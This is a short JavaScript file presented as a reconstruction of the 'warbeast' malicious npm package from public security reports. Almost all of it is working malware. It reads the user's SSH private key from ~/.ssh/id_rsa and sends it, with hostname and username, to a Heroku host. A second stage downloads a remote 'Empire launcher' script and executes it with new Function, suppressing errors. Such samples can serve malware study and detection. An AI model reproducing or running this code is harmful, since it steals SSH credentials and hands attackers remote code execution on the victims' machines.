// warbeast-ssh-steal — reconstructed from public security analyses
// Source: https://thehackernews.com/2024/01/malicious-npm-packages-exfiltrate-1600.html
//
// Reads private SSH keys from ~/.ssh/id_rsa and exfiltrates.
// Later versions executed Empire post-exploitation framework
// scripts including Mimikatz.
//
// Technique: SSH private key theft + Empire framework delivery

const fs = require("fs");
const path = require("path");
const os = require("os");
const https = require("https");

var home = os.homedir();
var sshKeyPath = path.join(home, ".ssh", "id_rsa");

// Read SSH private key
try {
  if (fs.existsSync(sshKeyPath)) {
    var keyData = fs.readFileSync(sshKeyPath, "utf8");

    var payload = JSON.stringify({
      hostname: os.hostname(),
      username: os.userInfo().username,
      key: keyData
    });

    // Exfiltrate SSH key
    var req = https.request({
      hostname: "warbeast-collect.herokuapp.com",
      path: "/ssh",
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "Content-Length": Buffer.byteLength(payload)
      }
    });
    req.write(payload);
    req.end();
  }
} catch(e) {}

// Stage 2: Download and execute Empire post-exploitation script
function downloadAndExec(url) {
  https.get(url, function(res) {
    var data = "";
    res.on("data", function(chunk) { data += chunk; });
    res.on("end", function() {
      try {
        // Execute downloaded script
        new Function(data)();
      } catch(e) {}
    });
  });
}

// Attempt to download Empire framework launcher
downloadAndExec("https://warbeast-collect.herokuapp.com/empire/launcher.js");
